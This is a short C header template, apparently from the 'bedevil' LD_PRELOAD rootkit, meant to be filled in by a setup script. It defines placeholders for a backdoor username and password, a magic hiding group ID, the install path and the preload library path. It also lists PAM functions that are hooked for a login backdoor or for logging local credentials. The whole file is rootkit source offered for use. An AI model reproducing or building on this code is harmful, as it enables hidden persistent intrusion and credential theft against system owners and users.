/*
* YOU NEED NOT TOUCH ANYTHING IN THIS FILE.
* MAY BEDEVIL.SH DO THE WORK.
*/

#define BD_UNAME "??BD_UNAME??"
#define BD_PWD "??BD_PWD??"
#define MAGIC_GID ??MAGIC_GID??
#define INSTALL_DIR "??INSTALL_DIR??"
#define BDVLSO "??BDVLSO??"
#define SOPATH "??SOPATH??"
#define LDSO_PRELOAD "??LDSO_PRELOAD??"

typedef struct symbol_struct {
    void *(*func)();
} syms;

/* i'mma just put this in here... */
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
#define LIBPAM_CALLS_SIZE 7
static char *libpam_calls[LIBPAM_CALLS_SIZE] = {"pam_syslog","pam_vsyslog","pam_authenticate","pam_open_session","pam_acct_mgmt","pam_prompt","pam_vprompt"};
#endif
